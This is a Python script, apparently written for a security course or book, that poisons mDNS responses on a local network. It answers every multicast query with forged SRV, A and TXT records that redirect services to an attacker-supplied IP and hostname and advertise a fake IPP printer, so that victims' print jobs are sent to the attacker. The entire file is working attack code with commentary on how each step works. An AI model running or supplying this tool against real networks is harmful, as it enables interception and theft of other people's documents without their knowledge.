#!/usr/bin/env python3

import argparse

import time, os, sys, struct, socket
from socketserver import UDPServer, ThreadingMixIn
from socketserver import BaseRequestHandler
from threading import Thread
from dnslib import *


parser = argparse.ArgumentParser(prog="mDNS_PP",
				 description="Listen to mDNS messages and cache poisoning to spoof printer device and retrieve documents",
				 epilog="Based on the book [BLABLABLA]")






parser.add_argument("-i", action="store", required=True, help="IP address of the attacker machine")
parser.add_argument("-n", action="store", required=True, help="Hostname of attacker machine (remember the .local suffix)")
parser.add_argument("-p", action="store", required=True, help="Name of the attacker printer")
args = parser.parse_args()




MADDR = ('224.0.0.251', 5353)
IP_ATTACKER = args.i
ATTK_HOSTNAME = args.n
PRINTER_NAME = args.p
hostname_low = ATTK_HOSTNAME.lower().split(".")[0]




class UDP_server(ThreadingMixIn, UDPServer):   # [1] UDP_Server that will run in a THREAD implementing parallelism, bind socket on the desired IP  
	allow_reuse_address = True	       #     allow the reuse of IP and SOCKET allows force the bind on same port when exploit restart
	
	def server_bind(self):
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		mreq = struct.pack("=4sl", socket.inet_aton(MADDR[0]), socket.INADDR_ANY)
		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq) # [2] connection to the mDNS multicast group (MADDR) with IP_ADD_MEMBERSHIP
		UDPServer.server_bind(self)







def MDNS_poisoner(host, port, handler): # [3] the poisoner serve forever the request until we force it to shutdown
	try:
		server = UDP_server((host, port), handler)
		server.serve_forever()
	except:
		print("Error when server start on port " + str(port))







class MDNS(BaseRequestHandler):
		
	def handle(self):
		target_service = ''
		data, soc = self.request	# [A] self.request return string (data ncoming) and IP:socket pair of the sender
		d = DNSRecord.parse(data)	# [B] conver the request in DNS record making easier to extract information...
		


		if d.header.q < 1:		# simple check if mdns packet have >=1 question(s)
			return

		target_service = d.questions[0]._qname	# [C] ...extract the domain name from the request from the question section
		
		# CREATION OF THE POISONED MDNS REPLY (with our IP_ADDR)
		d = DNSRecord(DNSHeader(qr=1, id=0, bitmap=33792))	# HEADER
		d.add_answer(RR(target_service, QTYPE.SRV, ttl=120, rclass=32769, rdata=SRV(priority=0, target=ATTK_HOSTNAME, weight=0, port=8000)))	# SRV (target_service ---> hostname)
		d.add_answer(RR(ATTK_HOSTNAME, QTYPE.A, ttl=120, rclass=32769, rdata=A(IP_ATTACKER)))	# A RECORD (hostname ---> ip_addr)
		# TXT (URL of fake printer to be contacted) [check the adminurl]
		d.add_answer(RR('{}._ipps._tcp.local'.format(PRINTER_NAME), QTYPE.TXT, ttl=4500, rclass=32769, rdata=TXT(["rp=ipp/print", "ty=Test Printer", "adminurl=https://{}:8000/ipp/print".format(hostname_low), "pdl=application/pdf, image/jpeg, image/pwg-raster","product=(Printer)", "Color=F", "Duplex=F", "usb_MFG=Test", "usb_MDL=Printer", "UUID=0544e1d1-bba0-3cdf-5ebf-1bd9f600e0fe", "TLS=1.2", "txtvers=1", "qtotal=1"])))

		soc.sendto(d.pack(), MADDR) # send the malicious ultra-poisoned reply :)
		print("[+] Poison-Answer sent to %s for name %s" %  (self.client_address[0], target_service))

		




def main():	# [4] main thread of mDNS server ---> every request call a thread (MDNS.handle)
	try:
		server_thread = Thread(target=MDNS_poisoner, args=('', 5353, MDNS,))
		server_thread.setDaemon(True)
		server_thread.start()

		print("[*] Listening mDNS multicast traffic")
		
		while True:
			time.sleep(0.1)
	
	except KeyboardInterrupt:
		sys.exit("\r[!] Exit for Keyboard Interrupt")





if __name__ == '__main__':
	main()
